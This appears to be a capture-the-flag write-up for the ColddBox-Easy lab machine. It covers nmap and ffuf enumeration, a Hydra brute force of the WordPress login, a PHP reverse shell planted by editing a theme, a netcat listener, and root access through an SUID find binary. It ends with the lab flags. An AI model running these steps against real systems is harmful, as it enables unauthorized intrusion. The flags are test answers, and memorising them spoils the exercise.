# ColddBox-Easy Writeup

## Enumeration

I started by scanning the target using Nmap:

```bash
nmap -sV -sC -oN scan 10.130.188.65
```

The scan revealed an Apache web server running a WordPress website.

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.1.31
|_http-title: ColddBox | One more machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

Since the target was running WordPress, I performed directory fuzzing using FFUF.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.130.188.65/FUZZ
```

The scan revealed several interesting directories, including a hidden directory named `hidden`.

```text
hidden                  [Status: 301]
wp-admin                [Status: 301]
wp-content              [Status: 301]
xmlrpc.php              [Status: 200]
```

Inside the `/hidden/` directory, I found the following note:

```text
U-R-G-E-N-T

C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles.

Philip
```

From this message, I identified possible usernames and passwords:

- c0ldd
    
- hugo
    
- philip
    

## WordPress Brute Force

I targeted the WordPress login page and used Hydra to brute-force the password for the user `c0ldd`.

```bash
hydra -l c0ldd -P /usr/share/wordlists/rockyou.txt -V -f 10.130.188.65 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:is incorrect"
```

Hydra successfully discovered valid credentials:

```text
c0ldd:9876543210
```

I logged into the WordPress admin panel using these credentials.

## Getting a Reverse Shell

After gaining access to the WordPress dashboard, I edited one of the theme PHP files and inserted a PHP reverse shell payload.

Before triggering the shell, I started a Netcat listener on my machine:

```bash
nc -lvnp 4444
```

After accessing the modified PHP file through the browser, I received a reverse shell as the `www-data` user.

## Upgrading the Shell

To make the shell more interactive, I upgraded it using Python PTY spawning:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then I fixed terminal features with:

```bash
export TERM=xterm
```

## Privilege Escalation

I searched for SUID binaries on the system:

```bash
find / -perm -4000 2>/dev/null
```

Among the results, I noticed that `/usr/bin/find` had the SUID bit set.

```text
/usr/bin/find
```

I checked [GTFOBins](https://gtfobins.github.io/?utm_source=chatgpt.com) and found a privilege escalation technique for `find`.

I executed the following command:

```bash
find . -exec /bin/sh -p \; -quit
```

This successfully spawned a root shell.

```text
# whoami
root
```

## User Flag

I navigated to the home directory of the user `c0ldd` and retrieved the user flag.

```bash
cd /home/c0ldd
cat user.txt
```

Flag:

```text
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

## Root Flag

Finally, I moved to the root directory and retrieved the root flag.

```bash
cd /root
cat root.txt
```

Flag:

```text
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

## Conclusion

This machine involved:

- WordPress enumeration
    
- Directory fuzzing
    
- Credential brute forcing
    
- Reverse shell through theme editing
    
- Linux privilege escalation using a misconfigured SUID binary